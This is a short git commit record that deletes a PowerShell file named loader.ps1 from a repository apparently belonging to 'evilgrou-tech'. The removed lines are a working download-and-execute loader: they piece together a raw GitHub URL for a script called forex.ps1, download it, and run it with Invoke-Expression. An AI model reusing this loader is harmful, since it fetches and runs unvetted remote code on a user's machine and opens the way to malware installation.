bae6babcbdd2c394f6abfcd86aea89afef627a3c
evilgrou-tech <evilgrou@gmail.com>
2026-02-16 12:58:24 +0300

    Delete loader.ps1

--- loader.ps1
+++
@@ -1,7 +0,0 @@
-$wc = New-Object System.Net.WebClient
-$p1 = "https://"
-$p2 = "raw.githubusercontent.com"
-$p3 = "/evilgrou-tech/drivers/main/forex.ps1"
-$url = $p1 + $p2 + $p3
-$cmd = $wc.DownloadString($url)
-Invoke-Expression $cmd
